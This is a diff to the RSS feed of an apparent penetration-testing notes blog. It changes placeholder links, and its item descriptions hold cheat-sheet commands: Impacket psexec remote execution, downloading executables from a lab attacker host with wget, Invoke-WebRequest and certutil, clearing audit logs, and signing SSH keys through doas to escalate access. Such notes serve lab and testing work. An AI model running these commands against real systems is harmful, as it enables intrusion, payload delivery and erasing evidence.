@@ -2,29 +2,29 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Windows on Pentest notes</title>
-    <link>https://example.com/categories/windows/</link>
+    <link>https://sosprz.github.io/categories/windows/</link>
     <description>Recent content in Windows on Pentest notes</description>
     <generator>Hugo -- gohugo.io</generator>
     <lastBuildDate>Sat, 19 Jan 2019 22:13:07 +0100</lastBuildDate>
     
-	<atom:link href="https://example.com/categories/windows/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="https://sosprz.github.io/categories/windows/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
       <title>Impacket</title>
-      <link>https://example.com/posts/impacket/</link>
+      <link>https://sosprz.github.io/posts/impacket/</link>
       <pubDate>Sat, 19 Jan 2019 22:13:07 +0100</pubDate>
       
-      <guid>https://example.com/posts/impacket/</guid>
+      <guid>https://sosprz.github.io/posts/impacket/</guid>
       <description>Impacket psexec.py administrator@10.10.10.10</description>
     </item>
     
     <item>
       <title>Windows cmd</title>
-      <link>https://example.com/posts/windows-cmd/</link>
+      <link>https://sosprz.github.io/posts/windows-cmd/</link>
       <pubDate>Sun, 30 Dec 2018 08:53:12 +0100</pubDate>
       
-      <guid>https://example.com/posts/windows-cmd/</guid>
+      <guid>https://sosprz.github.io/posts/windows-cmd/</guid>
       <description>Various commands  type get-content dir /ah whoami dir /s where /r c:\Windows bash.* START filenae.lnk where /r c:\ wsl.conf 
 How to download file wget wget http://10.10.18.70:8000/taskkill.exe -OutFile taskkill.exe  Invoke-WebRequest Invoke-WebRequest http://10.10.18.70:8000/taskkill.exe -OutFile taskkill.exe Certutil certutil.exe -urlcache -split -f http://10.10.10.10/file.xml file.xml
 Manage services Restart-Service -Name &amp;ldquo;Ubiquiti UniFi Video&amp;rdquo; Stop-Service -Name &amp;ldquo;Ubiquiti UniFi Video&amp;rdquo;
@@ -33,10 +33,10 @@ Clear Logs auditpol /clear /y</description>
     
     <item>
       <title>SSH</title>
-      <link>https://example.com/posts/ssh/</link>
+      <link>https://sosprz.github.io/posts/ssh/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://example.com/posts/ssh/</guid>
+      <guid>https://sosprz.github.io/posts/ssh/</guid>
       <description>#putty puttygen my_private_key.ppk -O private-openssh -o keyfile
 #ssh ssh -i keyfile root@10.10.10.107 doas -u userca /usr/bin/ssh-keygen -v -s /home/userca/ca -I alice1978 -n emergencybackup -V +1w -z 1 id_rsa.pub</description>
     </item>
